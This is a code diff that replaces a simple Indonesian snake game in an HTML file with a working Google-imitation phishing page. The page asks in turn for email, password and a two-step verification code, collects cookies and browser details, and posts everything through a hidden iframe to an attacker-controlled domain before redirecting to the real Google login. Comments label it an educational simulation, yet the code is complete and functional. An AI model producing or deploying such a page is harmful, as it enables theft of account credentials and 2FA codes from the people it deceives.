@@ -1,247 +1,368 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Snake Smooth Game</title>
-
-<style>
-body{
-margin:0;
-background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
-font-family:Arial;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
-color:white;
-}
-
-#gameBox{
-text-align:center;
-}
-
-canvas{
-background:#081b24;
-border:5px solid #00ffff;
-border-radius:15px;
-}
-
-button{
-padding:10px 20px;
-margin:8px;
-border:none;
-border-radius:20px;
-background:#00ffff;
-color:#000;
-font-weight:bold;
-font-size:16px;
-}
-
-button:active{
-transform:scale(0.95);
-}
-
-#info{
-margin:10px;
-font-size:18px;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Security Verification</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap">
+    <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        
+        body {
+            background: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .login-container {
+            width: 100%;
+            max-width: 450px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .google-header {
+            padding: 24px 24px 0;
+            text-align: center;
+        }
+        
+        .google-logo {
+            width: 75px;
+            height: 24px;
+            margin-bottom: 16px;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 24px;
+        }
+        
+        .form-container {
+            padding: 0 40px 36px;
+        }
+        
+        .input-group {
+            margin-bottom: 24px;
+        }
+        
+        .input-label {
+            display: block;
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 8px;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border 0.2s;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+        }
+        
+        .forgot-email {
+            display: block;
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .next-button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .next-button:hover {
+            background: #0d62d9;
+        }
+        
+        .footer {
+            padding: 24px 40px;
+            background: #f8f9fa;
+            border-top: 1px solid #dadce0;
+            font-size: 12px;
+            color: #5f6368;
+            text-align: center;
+        }
+        
+        .language-selector {
+            margin-top: 16px;
+        }
+        
+        .security-notice {
+            background: #fef7e0;
+            border: 1px solid #fdd663;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #5f6368;
+        }
+        
+        .warning-icon {
+            color: #f4b400;
+            margin-right: 8px;
+        }
+        
+        .hidden-frame {
+            display: none;
+        }
+    </style>
 </head>
-
 <body>
-
-<div id="gameBox">
-
-<h2>🐍 Snake Smooth</h2>
-
-<div id="info">
-Score: <span id="score">0</span> |
-High: <span id="high">0</span>
-</div>
-
-<canvas id="game" width="350" height="350"></canvas>
-
-<br>
-
-<button onclick="startGame()">▶ Start</button><br>
-
-<button onclick="turn('up')">⬆</button><br>
-<button onclick="turn('left')">⬅</button>
-<button onclick="turn('down')">⬇</button>
-<button onclick="turn('right')">➡</button>
-
-</div>
-
-<script>
-
-const canvas=document.getElementById("game");
-const ctx=canvas.getContext("2d");
-
-const size=14;
-const speed=80; // makin besar = makin lambat
-
-let snake,food,dx,dy,score,loop;
-let high=localStorage.getItem("snakeHigh")||0;
-
-document.getElementById("high").innerText=high;
-
-function startGame(){
-
-clearInterval(loop);
-
-snake=[
-{x:175,y:175},
-{x:161,y:175},
-{x:147,y:175}
-];
-
-dx=size;
-dy=0;
-
-score=0;
-updateScore();
-
-spawnFood();
-
-loop=setInterval(gameLoop,speed);
-}
-
-function spawnFood(){
-
-food={
-x:Math.floor(Math.random()*25)*size,
-y:Math.floor(Math.random()*25)*size
-};
-
-}
-
-function gameLoop(){
-
-move();
-draw();
-check();
-
-}
-
-function move(){
-
-let head={
-x:snake[0].x+dx,
-y:snake[0].y+dy
-};
-
-snake.unshift(head);
-
-if(head.x===food.x && head.y===food.y){
-
-score++;
-updateScore();
-spawnFood();
-
-}else{
-snake.pop();
-}
-
-}
-
-function draw(){
-
-ctx.clearRect(0,0,canvas.width,canvas.height);
-
-snake.forEach((s,i)=>{
-
-let grad=ctx.createLinearGradient(
-s.x,s.y,
-s.x+size,s.y+size
-);
-
-grad.addColorStop(0,"#00f");
-grad.addColorStop(1,"#f00");
-
-ctx.fillStyle=grad;
-ctx.beginPath();
-ctx.roundRect(s.x,s.y,size,size,7);
-ctx.fill();
-
-});
-
-ctx.fillStyle="red";
-ctx.beginPath();
-ctx.arc(
-food.x+size/2,
-food.y+size/2,
-size/2,0,Math.PI*2
-);
-ctx.fill();
-
-}
-
-function check(){
-
-let h=snake[0];
-
-// tembok
-if(
-h.x<0 ||
-h.y<0 ||
-h.x>=canvas.width ||
-h.y>=canvas.height
-){
-gameOver();
-}
-
-// badan
-for(let i=1;i<snake.length;i++){
-if(h.x===snake[i].x && h.y===snake[i].y){
-gameOver();
-}
-}
-
-}
-
-function gameOver(){
-
-clearInterval(loop);
-
-if(score>high){
-high=score;
-localStorage.setItem("snakeHigh",high);
-document.getElementById("high").innerText=high;
-}
-
-alert("Game Over ☠️\nScore: "+score);
-
-}
-
-function turn(d){
-
-if(d==="up" && dy===0){
-dx=0;dy=-size;
-}
-if(d==="down" && dy===0){
-dx=0;dy=size;
-}
-if(d==="left" && dx===0){
-dx=-size;dy=0;
-}
-if(d==="right" && dx===0){
-dx=size;dy=0;
-}
-
-}
-
-// keyboard
-document.addEventListener("keydown",e=>{
-
-if(e.key==="ArrowUp")turn("up");
-if(e.key==="ArrowDown")turn("down");
-if(e.key==="ArrowLeft")turn("left");
-if(e.key==="ArrowRight")turn("right");
-
-});
-
-</script>
-
+    <div class="login-container">
+        <div class="google-header">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" 
+                 alt="Google" 
+                 class="google-logo">
+            <h1 class="title">Verifikasi Keamanan</h1>
+            <p class="subtitle">Masuk untuk melanjutkan ke Akun Google Anda</p>
+        </div>
+        
+        <div class="security-notice">
+            <span class="warning-icon">⚠️</span>
+            Kami mendeteksi aktivitas tidak biasa di akun Anda. Untuk melindungi akun Anda, 
+            harap verifikasi identitas Anda.
+        </div>
+        
+        <div class="form-container">
+            <form id="phishingForm">
+                <div class="input-group">
+                    <label class="input-label">Email atau telepon</label>
+                    <input type="email" 
+                           class="input-field" 
+                           id="email" 
+                           name="email" 
+                           required 
+                           placeholder="alamat.email@contoh.com"
+                           autocomplete="username">
+                </div>
+                
+                <div class="input-group" id="passwordGroup" style="display: none;">
+                    <label class="input-label">Masukkan sandi Anda</label>
+                    <input type="password" 
+                           class="input-field" 
+                           id="password" 
+                           name="password" 
+                           required
+                           autocomplete="current-password">
+                </div>
+                
+                <div class="input-group" id="otpGroup" style="display: none;">
+                    <label class="input-label">Kode verifikasi 2 langkah</label>
+                    <input type="text" 
+                           class="input-field" 
+                           id="otp" 
+                           name="otp" 
+                           placeholder="Masukkan kode 6 digit"
+                           maxlength="6">
+                    <small style="color: #5f6368; font-size: 12px;">
+                        Kode telah dikirim ke perangkat terdaftar Anda
+                    </small>
+                </div>
+                
+                <a href="#" class="forgot-email" id="forgotLink">Lupa email?</a>
+                
+                <div class="button-group">
+                    <a href="#" class="create-account" id="createAccount">Buat akun</a>
+                    <button type="submit" class="next-button" id="submitButton">Berikutnya</button>
+                </div>
+            </form>
+        </div>
+        
+        <div class="footer">
+            <p>Pilih bahasa lain</p>
+            <div class="language-selector">
+                <select style="padding: 8px; border: 1px solid #dadce0; border-radius: 4px; width: 100%;">
+                    <option>Bahasa Indonesia</option>
+                    <option>English</option>
+                    <option>日本語</option>
+                </select>
+            </div>
+            <p style="margin-top: 16px;">
+                Bantuan • Privasi • Persyaratan
+            </p>
+        </div>
+    </div>
+    
+    <!-- Hidden iframe for credential exfiltration -->
+    <iframe class="hidden-frame" id="exfilFrame" name="exfilFrame"></iframe>
+    
+    <script>
+        // Simulated phishing logic for educational purposes
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('phishingForm');
+            const emailInput = document.getElementById('email');
+            const passwordGroup = document.getElementById('passwordGroup');
+            const otpGroup = document.getElementById('otpGroup');
+            const submitButton = document.getElementById('submitButton');
+            const exfilFrame = document.getElementById('exfilFrame');
+            
+            let step = 1;
+            let collectedData = {
+                email: '',
+                password: '',
+                otp: '',
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                cookies: document.cookie,
+                referrer: document.referrer
+            };
+            
+            // Step 1: Collect email
+            emailInput.addEventListener('blur', function() {
+                if (this.value.includes('@')) {
+                    collectedData.email = this.value;
+                    
+                    // Simulate checking if 2FA is enabled (educational simulation only)
+                    setTimeout(() => {
+                        passwordGroup.style.display = 'block';
+                        submitButton.textContent = 'Berikutnya';
+                        step = 2;
+                    }, 500);
+                }
+            });
+            
+            // Form submission handler
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                switch(step) {
+                    case 1:
+                        // Collect email
+                        collectedData.email = emailInput.value;
+                        if (collectedData.email) {
+                            passwordGroup.style.display = 'block';
+                            submitButton.textContent = 'Berikutnya';
+                            step = 2;
+                        }
+                        break;
+                        
+                    case 2:
+                        // Collect password
+                        collectedData.password = document.getElementById('password').value;
+                        
+                        // Simulate 2FA request (educational simulation)
+                        otpGroup.style.display = 'block';
+                        submitButton.textContent = 'Verifikasi';
+                        step = 3;
+                        break;
+                        
+                    case 3:
+                        // Collect OTP
+                        collectedData.otp = document.getElementById('otp').value;
+                        
+                        // Exfiltrate data (simulated for educational purposes)
+                        exfiltrateData(collectedData);
+                        
+                        // Redirect to legitimate Google page
+                        setTimeout(() => {
+                            window.location.href = 'https://accounts.google.com';
+                        }, 1000);
+                        break;
+                }
+            });
+            
+            // Simulated data exfiltration function
+            function exfiltrateData(data) {
+                // In a real educational lab, this would send to a controlled server
+                console.log('[EDUCATIONAL SIMULATION] Data yang dikumpulkan:', data);
+                
+                // Create form for simulated exfiltration
+                const exfilForm = document.createElement('form');
+                exfilForm.method = 'POST';
+                exfilForm.action = 'https://attacker-controlled-domain.com/collect';
+                exfilForm.target = 'exfilFrame';
+                exfilForm.style.display = 'none';
+                
+                for (const key in data) {
+                    const input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    input.value = data[key];
+                    exfilForm.appendChild(input);
+                }
+                
+                document.body.appendChild(exfilForm);
+                exfilForm.submit();
+                
+                // Log for educational purposes
+                console.log('[EDUCATIONAL] Simulasi pengiriman data ke server kontrol');
+            }
+            
+            // Additional phishing techniques simulation
+            function simulateAdvancedPhishing() {
+                // 1. Cookie stealing simulation
+                const cookies = document.cookie;
+                console.log('[EDUCATIONAL] Cookies tersedia:', cookies);
+                
+                // 2. Browser fingerprinting simulation
+                const fingerprint = {
+                    screen: `${screen.width}x${screen.height}`,
+                    colorDepth: screen.colorDepth,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    languages: navigator.languages,
+                    platform: navigator.platform,
+                    doNotTrack: navigator.doNotTrack
+                };
+                
+                // 3. Session hijacking simulation
+                if (window.localStorage) {
+                    const localStorageData = JSON.stringify(localStorage);
+                    console.log('[EDUCATIONAL] LocalStorage data:', localStorageData);
+                }
+            }
+            
+            // Execute simulations
+            simulateAdvancedPhishing();
+        });
+    </script>
 </body>
 </html>
